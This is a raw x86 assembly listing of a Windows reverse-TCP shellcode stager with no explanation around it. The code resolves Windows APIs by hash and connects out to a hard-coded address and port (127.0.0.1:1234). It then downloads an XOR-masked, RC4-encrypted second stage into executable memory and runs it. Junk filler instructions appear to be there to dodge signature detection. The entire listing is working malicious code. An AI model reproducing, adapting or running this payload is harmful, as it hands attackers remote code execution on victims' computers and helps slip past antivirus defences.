```asm
_start:
    cld
    call L_95
RET_6:
    pushal
    mov ebp, esp
    mov edx, 0
    test edx, edx
    mov edx, dword ptr fs:[edx + 0x30]
    mov edx, dword ptr [edx + 0xc]
    mov edx, dword ptr [edx + 0x14]
L_15:
    mov esi, dword ptr [edx + 0x28]
    mov edi, 0
    test edi, edi
    movzx ecx, word ptr [edx + 0x26]
L_1e:
    mov eax, 0
    test eax, eax
    lodsb al, byte ptr [esi]
    cmp al, 0x61
    jl L_27
    add al, 0xE0
L_27:
    ror edi, 0xd
    add edi, eax
    sub ecx, 1
    jne L_1e
    push edx
    mov edx, dword ptr [edx + 0x10]
    push edi
    mov eax, dword ptr [edx + 0x3c]
    add eax, edx
    mov eax, dword ptr [eax + 0x78]
    test eax, eax
    je L_8c
    add eax, edx
    mov ecx, dword ptr [eax + 0x18]
    mov ebx, dword ptr [eax + 0x20]
    add ebx, edx
    push eax
L_4b:
    test ecx, ecx
    je L_8b
    sub ecx, 1
    mov esi, dword ptr [ebx + ecx*4]
    add esi, edx
    mov edi, 0
    test edi, edi
L_57:
    mov eax, 0
    test eax, eax
    ror edi, 0xd
    lodsb al, byte ptr [esi]
    add edi, eax
    cmp al, ah
    jne L_57
    add edi, dword ptr [ebp - 8]
    cmp edi, dword ptr [ebp + 0x24]
    jne L_4b
    pop eax
    mov ebx, dword ptr [eax + 0x24]
    add ebx, edx
    mov cx, word ptr [ebx + ecx*2]
    mov ebx, dword ptr [eax + 0x1c]
    add ebx, edx
    mov eax, dword ptr [ebx + ecx*4]
    add eax, edx
    mov dword ptr [esp + 0x24], eax
    pop ebx
    pop ebx
    popal
    pop ecx
    pop edx
    push ecx
    jmp eax
L_8b:
    pop eax
L_8c:
    pop edi
    pop edx
    mov edx, dword ptr [edx]
    jmp L_15
L_95:
    pop ebp
    push 0x3233
    push 0x5f327377
    push esp
    push 0x726774c
    lea eax, [ebp + 0]
    call eax
    mov eax, 0x190
    sub esp, eax
    push esp
    push eax
    push 0x6b8029
    call ebp
    push 0xa
L_bc:
    push 0x100007f
    push 0xd2040002
    mov esi, esp
    push eax
    push eax
    push eax
    push eax
    add eax, 1
    push eax
    add eax, 1
    push eax
    push 0xe0df0fea
    call ebp
    xchg edi, eax
L_d8:
    push 0x10
    push esi
    push edi
    push 0x6174a599
    call ebp
    test eax, eax
    je L_f1
    dec dword ptr [esi + 8]
    jne L_d8
L_ec:
    call L_1cd
L_f1:
    push 0
    push 4
    push esi
    push edi
    push 0x5fc8d902
    call ebp
    cmp eax, 0
    jle L_14c
    mov esi, dword ptr [esi]
    xor esi, 0xd3a205a0
    lea ecx, [esi + 0x100]
    push 0x40
    push 0x1000
    push ecx
    push 0
    push 0xe553a458
    call ebp
    lea ebx, [eax + 0x100]
    push ebx
    push esi
    push eax
L_12b:
    push 0
    push esi
    push ebx
    push edi
    push 0x5fc8d902
    call ebp
    cmp eax, 0
    jge L_164
    pop eax
    push 0x4000
    push 0
    push eax
    push 0x300f2f0b
    call ebp
L_14c:
    push edi
    push 0x614d6e75
    call ebp
    pop esi
    pop esi
    dec dword ptr [esp]
    jne L_bc
    jmp L_ec
L_164:
    add ebx, eax
    sub esi, eax
    jne L_12b
    pop ebx
    pop ecx
    pop ebp
    push ebp
    push edi
    mov edi, ebx
    call L_186
    .byte 0x34, 0x2A, 0x68, 0x7E, 0xA2, 0xD0, 0x53, 0x60, 0xC9, 0x53, 0x10, 0x7A, 0xCB, 0xE8, 0x3E, 0x08
L_186:
    pop esi
    xor eax, eax
L_186_loop:
    stosb
    inc al
    jne L_186_loop
    sub edi, 0x100
    xor ebx, ebx
L_196:
    add bl, byte ptr [edi + eax]
    lea edx, [eax + 0]
    and dl, 0xf
    add bl, byte ptr [esi + edx]
    mov dl, byte ptr [edi + eax]
    xchg byte ptr [edi + ebx], dl
    mov byte ptr [edi + eax], dl
    add al, 1
    jne L_196
    mov ebx, 0
    test ebx, ebx
L_1b0:
    add al, 1
    add bl, byte ptr [edi + eax]
    mov dl, byte ptr [edi + eax]
    xchg byte ptr [edi + ebx], dl
    mov byte ptr [edi + eax], dl
    add dl, byte ptr [edi + ebx]
    mov dl, byte ptr [edi + edx]
    xor byte ptr [ebp], dl
    add ebp, 1
    sub ecx, 1
    jne L_1b0
    pop edi
    ret
L_1cd:
    mov ebx, 0x56a2b5f0
    push 0
    push ebx
    call ebp
```